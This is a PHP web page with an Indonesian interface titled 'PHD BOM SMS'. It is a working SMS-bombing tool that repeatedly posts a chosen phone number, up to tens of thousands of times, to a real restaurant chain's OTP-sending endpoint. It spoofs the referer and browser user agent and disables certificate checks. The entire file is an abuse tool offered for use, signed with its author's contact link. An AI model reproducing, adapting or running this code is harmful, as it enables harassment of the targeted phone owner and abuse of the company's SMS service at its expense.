<?php

  error_reporting(0);
  
  $nope = trim($_POST["nope"]);
  $jumlah = trim($_POST["jumlah"]);
  $delay = trim($_POST["delay"]);
  $submit = $_POST["submit"];
  
function phd($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.phd.co.id/en/users/sendOTP");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=".$no);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.phd.co.id/en/users/createnewuser');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
 
     if(isset($submit)){
     phd($nope,$jumlah,$delay);
     
     }
?>
<!DOCUMENT html>
<html>
<head><title>PHD BOM SMS</title></head>
<style type="text/css">

body{
    background-color:blue;
    
}
h1{
   text-align:center;
   font-size:50px;
   color:red;
}
.kaka{
      background:black;
      color:white;
      font-size:20px;

}


</style>
<body>
<h1> Phd bom sms </h1>
<div style="border:transparent 1px solid;">
<div style="border:#694900 1px dashed;">
<div style="border:#795900 1px solid;">
<div style="border:orange 1px solid;">
<div style="border:#795900 1px solid;">
<div style="border:#694900 1px dashed;">
<div style="background-color:transparent">
<div style="border:transparent 1px dashed;">
<center>BOM SMS</center>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div style="border-top:#1f0000 1px solid;">
<div style="border-top:#2f0000 1px solid;">
<div style="border-top:#3f0000 1px solid;">
<div style="border-top:#4f0000 1px solid;">
<div style="border-top:#5f0000 1px solid;">
<div style="border-top:#6f0000 1px solid;">
<div style="border-top:#7f0000 1px solid;">
<div style="border-top:#8f0000 1px solid;">
<div style="border-top:#9f0000 1px solid;">
<div style="border-top:#9f0000 1px solid;">
<div style="border-top:#8f0000 1px solid;">
<div style="border-top:#7f0000 1px solid;">
<div style="border-top:#6f0000 1px solid;">
<div style="border-top:#5f0000 1px solid;">
<div style="border-top:#4f0000 1px solid;">
<div style="border-top:#3f0000 1px solid;">
<div style="border-top:#2f0000 1px solid;">
<div style="border-top:#1f0000 1px solid;">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<p style="font-size:40px;color:white;background:black;">Bom SMS PHD</p>
<div class="kaka">
<form action="" method="POST">
<label style="font-size:30px;">Nomor tlp :</label>
<input type="text" name="nope" placeholder="62852xxxxxxxx">
<br>
<label style="font-size:30px;">Jumlah :</label>
<input type="text" name="jumlah" placeholder="0-99999">
<br>
<label style="font-size:30px;">Delay :</label>
<input type="text" name="delay" placeholder="0,005">
<br><?php
for($a =0; $a < 5; $a++){
echo"&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp";
}?>
<button type="submit" name="submit">Tembak</button>
</div>
<h2 style="text-align:center;color:white;background:black;font-size:30px;">Terimakasih</h2>
<br>
<h3 style="text-align:center;color:white;background:black;font-size:20px;">Apabila tools ini tidak brkerja silahkan inbox di <a href="https://facebook.com/kakaroto.kakaroto.3328">FACEBOOK</a> kami<br/>
@created by <a href="https://facebook.com/kakaroto.kakaroto.3328">KAKATOJI</a> </h3>
</body>



</html>